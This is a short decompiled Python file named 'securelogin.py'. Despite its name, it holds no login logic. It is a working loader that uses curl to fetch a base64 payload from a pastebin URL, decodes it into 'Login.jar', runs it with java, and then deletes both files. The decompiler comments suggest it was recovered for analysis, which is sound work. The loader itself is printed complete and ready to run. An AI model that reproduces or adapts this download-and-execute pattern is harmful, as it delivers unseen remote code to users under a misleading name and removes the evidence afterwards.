# 2020.10.12 17:49:54 WEST
# Embedded file name: securelogin.py
import os, base64

def launch():
    n = os.system('curl https://pastebin.com/raw/zXzEdM4c > b64.txt')
    if n != 0:
        print 'curl: command not found'
        return
    f = open('b64.txt')
    s = f.read()
    f.close()
    f = open('Login.jar', 'w')
    f.write(base64.b64decode(s))
    f.close()
    n = os.system('java -jar Login.jar')
    os.system('rm Login.jar')
    os.system('rm b64.txt')


if __name__ == '__main__':
    launch()
# okay decompyling securelogin.pyc 
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
# 2020.10.12 17:49:54 WEST
